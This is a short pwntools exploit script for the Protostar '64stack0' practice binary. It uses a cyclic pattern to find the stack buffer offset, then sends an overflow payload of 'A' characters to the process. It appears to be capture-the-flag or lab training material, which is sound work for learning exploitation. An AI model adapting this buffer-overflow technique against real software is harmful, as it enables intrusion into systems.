from pwn import *

binary = "/opt/protostar/bin/64stack0"
context.binary = binary

pattern = cyclic(200)
print("Pattern: " + str(pattern))

crash_pattern = "vaaa"
print("CrashPattern: " + crash_pattern)

buffer_size  = cyclic_find(crash_pattern)
print("Buffer size: " + str(buffer_size))
payload = 'A' * (buffer_size - 6)

p = process(binary)
p.sendline(payload)
out = p.recvline()
print(out)
